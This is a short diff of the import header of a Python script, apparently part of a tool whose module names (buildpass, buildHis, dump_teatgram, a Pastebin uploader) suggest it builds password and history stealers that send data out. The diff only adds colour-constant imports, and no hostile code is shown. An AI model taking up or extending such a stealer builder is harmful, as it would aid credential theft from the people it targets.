@@ -1,5 +1,3 @@
-
-
 # -*- coding: utf-8 -*-
 # Author: Abdulrahman Mohammed (De3vil)
 # Don't touch my code, it's art 
@@ -8,7 +6,7 @@ from pbwrap import Pastebin
 from subprocess import call
 from modules_version2.Moud import buildHis  , buildpass , Files , pastbintestuploading , dump_teatgram , dropprrt
 from modules_version2.Banar_color import ascii_txt
-from modules_version2.Banar_color.ascii_txt import merry , WI , W ,Y, B , M ,Q , G , R , X , Z  ,bl , txt , txt1 , cheeksystem
+from modules_version2.Banar_color.ascii_txt import merry , WI , W ,Y, B , M ,Q , G , R , X , Z  ,bl , txt , txt1 , cheeksystem , res ,BOOLD ,F
 import os
 from os import system , remove ,name,path
 from shutil import rmtree
